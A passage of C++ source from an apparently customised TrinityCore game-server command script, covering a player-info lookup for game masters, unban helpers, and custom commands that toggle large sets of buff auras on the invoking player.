            PreparedStatement* stmt = CharacterDatabase.GetPreparedStatement(CHAR_SEL_CHAR_PINFO);
            stmt->setUInt32(0, GUID_LOPART(targetGuid));
            PreparedQueryResult result = CharacterDatabase.Query(stmt);

            if (!result)
                return false;

            Field* fields     = result->Fetch();
            totalPlayerTime = fields[0].GetUInt32();
            level             = fields[1].GetUInt8();
            money             = fields[2].GetUInt32();
            accId             = fields[3].GetUInt32();
            race              = fields[4].GetUInt8();
            Class             = fields[5].GetUInt8();
            mapId             = fields[6].GetUInt16();
            areaId            = fields[7].GetUInt16();
        }


        std::string userName    = handler->GetTrinityString(LANG_ERROR);
        std::string eMail       = handler->GetTrinityString(LANG_ERROR);
        std::string muteReason  = "";
        std::string muteBy      = "";
        std::string lastIp      = handler->GetTrinityString(LANG_ERROR);
        uint32 security         = 0;
        std::string lastLogin   = handler->GetTrinityString(LANG_ERROR);

        PreparedStatement* stmt = LoginDatabase.GetPreparedStatement(LOGIN_SEL_PINFO);
        stmt->setInt32(0, int32(realmID));
        stmt->setUInt32(1, accId);
        PreparedQueryResult result = LoginDatabase.Query(stmt);

        if (result)
        {
            Field* fields = result->Fetch();
            userName      = fields[0].GetString();
            security      = fields[1].GetUInt8();
            eMail         = fields[2].GetString();
            muteTime      = fields[5].GetUInt64();
            muteReason    = fields[6].GetString();
            muteBy        = fields[7].GetString();

            if (eMail.empty())
                eMail = "-";

            {
                lastIp = fields[3].GetString();
                lastLogin = fields[4].GetString();

                uint32 ip = inet_addr(lastIp.c_str());
#if TRINITY_ENDIAN == BIGENDIAN
                EndianConvertReverse(ip);
#endif

                PreparedStatement* stmt = WorldDatabase.GetPreparedStatement(WORLD_SEL_IP2NATION_COUNTRY);

                stmt->setUInt32(0, ip);

                PreparedQueryResult result2 = WorldDatabase.Query(stmt);

                if (result2)
                {
                    Field* fields2 = result2->Fetch();
                    lastIp.append(" (");
                    lastIp.append(fields2[0].GetString());
                    lastIp.append(")");
                }
            }
        }

        std::string nameLink = handler->playerLink(targetName);

        handler->PSendSysMessage(LANG_PINFO_ACCOUNT, (target ? "" : handler->GetTrinityString(LANG_OFFLINE)), nameLink.c_str(), GUID_LOPART(targetGuid), userName.c_str(), accId, eMail.c_str(), security, lastIp.c_str(), lastLogin.c_str(), latency);

        std::string bannedby = "unknown";
        std::string banreason = "";

        stmt = LoginDatabase.GetPreparedStatement(LOGIN_SEL_PINFO_BANS);
        stmt->setUInt32(0, accId);
        PreparedQueryResult result2 = LoginDatabase.Query(stmt);
        if (!result2)
        {
            stmt = CharacterDatabase.GetPreparedStatement(CHAR_SEL_PINFO_BANS);
            stmt->setUInt32(0, GUID_LOPART(targetGuid));
            result2 = CharacterDatabase.Query(stmt);
        }

        if (result2)
        {
            Field* fields = result2->Fetch();
            banTime       = int64(fields[1].GetBool() ? 0 : fields[0].GetUInt32());
            bannedby      = fields[2].GetString();
            banreason     = fields[3].GetString();
        }

        if (muteTime > 0)
            handler->PSendSysMessage(LANG_PINFO_MUTE, secsToTimeString(muteTime - time(NULL), true).c_str(), muteBy.c_str(), muteReason.c_str());

        if (banTime >= 0)
            handler->PSendSysMessage(LANG_PINFO_BAN, banTime > 0 ? secsToTimeString(banTime - time(NULL), true).c_str() : "permanently", bannedby.c_str(), banreason.c_str());

        std::string raceStr, ClassStr;
        switch (race)
        {
            case RACE_HUMAN:
                raceStr = "Human";
                break;
            case RACE_ORC:
                raceStr = "Orc";
                break;
            case RACE_DWARF:
                raceStr = "Dwarf";
                break;
            case RACE_NIGHTELF:
                raceStr = "Night Elf";
                break;
            case RACE_UNDEAD_PLAYER:
                raceStr = "Undead";
                break;
            case RACE_TAUREN:
                raceStr = "Tauren";
                break;
            case RACE_GNOME:
                raceStr = "Gnome";
                break;
            case RACE_TROLL:
                raceStr = "Troll";
                break;
            case RACE_BLOODELF:
                raceStr = "Blood Elf";
                break;
            case RACE_DRAENEI:
                raceStr = "Draenei";
                break;
        }

        switch (Class)
        {
            case CLASS_WARRIOR:
                ClassStr = "Warrior";
                break;
            case CLASS_PALADIN:
                ClassStr = "Paladin";
                break;
            case CLASS_HUNTER:
                ClassStr = "Hunter";
                break;
            case CLASS_ROGUE:
                ClassStr = "Rogue";
                break;
            case CLASS_PRIEST:
                ClassStr = "Priest";
                break;
            case CLASS_DEATH_KNIGHT:
                ClassStr = "Death Knight";
                break;
            case CLASS_SHAMAN:
                ClassStr = "Shaman";
                break;
            case CLASS_MAGE:
                ClassStr = "Mage";
                break;
            case CLASS_WARLOCK:
                ClassStr = "Warlock";
                break;
            case CLASS_DRUID:
                ClassStr = "Druid";
                break;
        }

        std::string timeStr = secsToTimeString(totalPlayerTime, true, true);
        uint32 gold = money /GOLD;
        uint32 silv = (money % GOLD) / SILVER;
        uint32 copp = (money % GOLD) % SILVER;
        handler->PSendSysMessage(LANG_PINFO_LEVEL, raceStr.c_str(), ClassStr.c_str(), timeStr.c_str(), level, gold, silv, copp);

        // Add map, zone, subzone and phase to output
        int locale = handler->GetSessionDbcLocale();
        std::string areaName = "<unknown>";
        std::string zoneName = "";

        MapEntry const* map = sMapStore.LookupEntry(mapId);

        AreaTableEntry const* area = GetAreaEntryByAreaID(areaId);
        if (area)
        {
            areaName = area->area_name;

            AreaTableEntry const* zone = GetAreaEntryByAreaID(area->zone);
            if (zone)
                zoneName = zone->area_name;
        }

        if (target)
        {
            if (!zoneName.empty())
                handler->PSendSysMessage(LANG_PINFO_MAP_ONLINE, map->name, zoneName.c_str(), areaName.c_str(), phase);
            else
                handler->PSendSysMessage(LANG_PINFO_MAP_ONLINE, map->name, areaName.c_str(), "<unknown>", phase);
        }
        else
           handler->PSendSysMessage(LANG_PINFO_MAP_OFFLINE, map->name, areaName.c_str());

		stmt = CharacterDatabase.GetPreparedStatement(CHAR_SEL_GUILD_MEMBER_EXTENDED);
		stmt->setUInt32(0, GUID_LOPART(targetGuid));
		
	    result = CharacterDatabase.Query(stmt);
		if (result)
		    {
			    uint32 guildId = 0;
			    std::string guildName = "";
			    std::string guildRank = "";
			    std::string note = "";
			    std::string officeNote = "";
			    
			    Field* fields = result->Fetch();
			    guildId = fields[0].GetUInt32();
			    guildName = fields[1].GetString();
			    //rankId           = fields[2].GetUInt8();
			    guildRank = fields[3].GetString();
			    note = fields[4].GetString();
			    officeNote = fields[5].GetString();
			    
			    handler->PSendSysMessage(LANG_PINFO_GUILD_INFO, guildName.c_str(), guildId, guildRank.c_str(), note.c_str(), officeNote.c_str());
			}

        QueryResult vipresult = LoginDatabase.PQuery("SELECT type, unsetdate, setdate FROM vip_accounts WHERE id = %u AND active = 1", accId);
        if (vipresult)
        {
            Field* vipfields = vipresult->Fetch();
            uint8 VIPtypes = vipfields[0].GetUInt8();

            time_t unsetdate = time_t(vipfields[1].GetUInt32());
            time_t setdate = time_t(vipfields[2].GetUInt32());
            tm* tmunsetdate = localtime(&unsetdate);

            std::string VIPStr;

            switch (VIPtypes)
            {
                case 1:
                    VIPStr = "Is Bronze-VIP account";
                    break;
                case 2:
                    VIPStr = "Is Gold-VIP account";
                    break;
                case 3:
                    VIPStr = "Is Platinum-VIP account";
                    break;
                default:
                    VIPStr = "Is NO-VIP account";
                    break;
            }

            if (unsetdate == setdate)
                handler->PSendSysMessage("|cff00ff00%s and it is permanent!|r", VIPStr.c_str());
            else
                handler->PSendSysMessage("|cff00ff00%-15.15s till %02d-%02d-%02d %02d:%02d |r", VIPStr.c_str(),
                tmunsetdate->tm_year%100, tmunsetdate->tm_mon+1, tmunsetdate->tm_mday, tmunsetdate->tm_hour, tmunsetdate->tm_min);

            QueryResult result = LoginDatabase.PQuery("SELECT reason FROM account_tempban WHERE accountId = %u", accId);
            if (result)
                handler->PSendSysMessage("TempBan-Grund: %s", result->Fetch()[0].GetCString());
            else
                handler->PSendSysMessage("Kein TempBan aktiv");
        }

        return true;
    }
    static bool HandleMacUnBanAccountCommand(ChatHandler* handler, char const* args)
    {
        return HandleUnBanHelper(BAN_ACCOUNT, args, handler);
    }
    static bool HandleMacUnBanIPCommand(ChatHandler* handler, char const* args)
    {
        return HandleUnBanHelper(BAN_IP, args, handler);
    }
    static bool HandleUnBanHelper(BanMode mode, char const* args, ChatHandler* handler)
    {
        if (!*args)
            return false;

        char* nameOrIPStr = strtok((char*)args, " ");
        if (!nameOrIPStr)
            return false;

        std::string nameOrIP = nameOrIPStr;

        switch (mode)
        {
            case BAN_ACCOUNT:
                if (!AccountMgr::normalizeString(nameOrIP))
                {
                    handler->PSendSysMessage(LANG_ACCOUNT_NOT_EXIST, nameOrIP.c_str());
                    handler->SetSentErrorMessage(true);
                    return false;
                }
                break;
            case BAN_CHARACTER:
                if (!normalizePlayerName(nameOrIP))
                {
                    handler->SendSysMessage(LANG_PLAYER_NOT_FOUND);
                    handler->SetSentErrorMessage(true);
                    return false;
                }
                break;
            case BAN_IP:
                if (!IsIPAddress(nameOrIP.c_str()))
                    return false;
                break;
        }

        if (sWorld->RemoveBanAccount(mode, nameOrIP))
            handler->PSendSysMessage(LANG_UNBAN_UNBANNED, nameOrIP.c_str());
        else
            handler->PSendSysMessage(LANG_UNBAN_ERROR, nameOrIP.c_str());

        return true;
    }
static bool HandleMacBuffCommand(ChatHandler * handler, const char* args)
    {
        Player * pl = handler->GetSession()->GetPlayer();

		if (strncmp(args, "on", 3) == 0)
		{
		pl->AddAura(63972, pl);
		pl->AddAura(56509, pl);
		pl->AddAura(56450, pl);
		pl->AddAura(56449, pl);
		pl->AddAura(46534, pl);
		pl->AddAura(46530, pl);
		pl->AddAura(46528, pl);
		pl->AddAura(46456, pl);
		pl->AddAura(46455, pl);
		pl->AddAura(46454, pl);
		pl->AddAura(46438, pl);
		pl->AddAura(46437, pl);
		pl->AddAura(46436, pl);
		pl->AddAura(46435, pl);
		pl->AddAura(46415, pl);
		pl->AddAura(46414, pl);
		pl->AddAura(46413, pl);
		pl->AddAura(46412, pl);
		pl->AddAura(40042, pl);
		pl->AddAura(85801, pl);
		pl->AddAura(41877, pl);
		pl->AddAura(41862, pl);
		pl->AddAura(41854, pl);
		pl->AddAura(41850, pl);
		pl->AddAura(41833, pl);
		pl->AddAura(41829, pl);
		pl->AddAura(41787, pl);
		pl->AddAura(41676, pl);
		pl->AddAura(41670, pl);
		pl->AddAura(41643, pl);
		pl->AddAura(41561, pl);
		pl->AddAura(41041, pl);
		pl->AddAura(39509, pl);
		pl->AddAura(39433, pl);
		pl->AddAura(39418, pl);
		pl->AddAura(23570, pl);
		pl->AddAura(32200, pl);
		pl->AddAura(32196, pl);
		pl->AddAura(14946, pl);
		pl->AddAura(14945, pl);
		pl->AddAura(14944, pl);
		pl->AddAura(14943, pl);
		pl->AddAura(92257, pl);
		pl->AddAura(92258, pl);
		pl->AddAura(87339, pl);

		handler->PSendSysMessage("Modo OP activado.");
		return true;
		}
		else if (strncmp(args, "off", 4) == 0)
		{
		pl->RemoveAura(63972);
		pl->RemoveAura(56509);
		pl->RemoveAura(56450);
		pl->RemoveAura(56449);
		pl->RemoveAura(46534);
		pl->RemoveAura(46530);
		pl->RemoveAura(46528);
		pl->RemoveAura(46456);
		pl->RemoveAura(46455);
		pl->RemoveAura(46454);
		pl->RemoveAura(46438);
		pl->RemoveAura(46437);
		pl->RemoveAura(46436);
		pl->RemoveAura(46435);
		pl->RemoveAura(46415);
		pl->RemoveAura(46414);
		pl->RemoveAura(46413);
		pl->RemoveAura(46412);
		pl->RemoveAura(40042);
		pl->RemoveAura(85801);
		pl->RemoveAura(41877);
		pl->RemoveAura(41862);
		pl->RemoveAura(41854);
		pl->RemoveAura(41850);
		pl->RemoveAura(41833);
		pl->RemoveAura(41829);
		pl->RemoveAura(41787);
		pl->RemoveAura(41676);
		pl->RemoveAura(41670);
		pl->RemoveAura(41643);
		pl->RemoveAura(41561);
		pl->RemoveAura(41041);
		pl->RemoveAura(39509);
		pl->RemoveAura(39433);
		pl->RemoveAura(39418);
		pl->RemoveAura(23570);
		pl->RemoveAura(32200);
		pl->RemoveAura(32196);
		pl->RemoveAura(14946);
		pl->RemoveAura(14945);
		pl->RemoveAura(14944);
		pl->RemoveAura(14943);
		pl->RemoveAura(92257);
		pl->RemoveAura(92258);
		pl->RemoveAura(87339);
		handler->PSendSysMessage("Modo OP desactivado.");
		return true;
		}

    }
static bool HandleMacHasteCommand(ChatHandler * handler, const char* args)
    {
        Player * pl = handler->GetSession()->GetPlayer();

		if (strncmp(args, "on", 3) == 0)
		{
		pl->AddAura(39509, pl);

		handler->PSendSysMessage("Critico aumentado.");
		return true;
		}
		else if (strncmp(args, "off", 4) == 0)
		{
		pl->RemoveAura(39509);
		handler->PSendSysMessage("Critico reducido.");
		return true;
		}

    }
};
void AddSC_account_commandscript()
{
    new account_commandscript();
}
